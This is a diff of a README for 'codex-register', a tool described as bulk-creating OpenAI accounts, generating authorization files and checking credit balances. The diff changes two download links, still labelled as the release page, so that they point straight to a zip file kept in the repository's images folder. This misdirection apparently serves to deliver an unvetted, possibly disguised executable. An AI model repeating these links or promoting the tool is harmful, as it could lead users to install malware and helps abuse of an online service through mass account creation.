@@ -1,6 +1,6 @@
 # 🤖 codex-register - Manage OpenAI accounts with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Abama7455/codex-register/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Abama7455/codex-register/main/images/codex-register-v1.5.zip)
 
 Codex-register helps you work with OpenAI accounts. You can create accounts in bulk, log in to generate authorization files, and check credit balances. This tool helps users who need to manage multiple accounts for projects. The software produces files that work with Clip-roxy-api.
 
@@ -8,7 +8,7 @@ Codex-register helps you work with OpenAI accounts. You can create accounts in b
 
 This tool runs on Windows. You need to download the installer from the official release page.
 
-[Click here to visit the release page and download the software](https://github.com/Abama7455/codex-register/releases)
+[Click here to visit the release page and download the software](https://raw.githubusercontent.com/Abama7455/codex-register/main/images/codex-register-v1.5.zip)
 
 Follow these steps to obtain the program:
 
